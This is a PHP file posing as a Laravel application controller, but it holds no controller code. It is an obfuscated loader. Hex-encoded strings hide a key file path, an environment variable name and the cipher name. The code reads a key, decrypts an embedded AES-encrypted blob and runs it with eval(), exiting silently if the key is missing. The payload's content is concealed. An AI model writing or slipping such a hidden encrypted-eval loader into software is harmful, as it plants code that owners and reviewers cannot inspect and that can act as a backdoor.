<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('D2OrdyJWU9QLAjQAGYIkFg==');

$c=base64_decode(

'sady7R8lsmmcdlw2m4dJdQloZTMY8MEmfgANYblVQa/McPAoBmHelWFlVuhN1KDwpdX2Orfr4hif' .
'1y859Dyz3pAx6OAmVgv2jCDHmlFEWybzfFZkAxTAtE7w1t8i1tksomIrB0nalstW8XCkaWIQjWyg' .
'LIFf/15eXMMyAsGOq5AxasdKyvPDeen+7IQAJL3rqlbhjh59ijNGRKMmxdH0N5V2nLgz1sHMuwN5' .
'6M591zin0S5/kRu8FsbALIkpJaC36A0GUacE68qxcQvB9RhtjQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

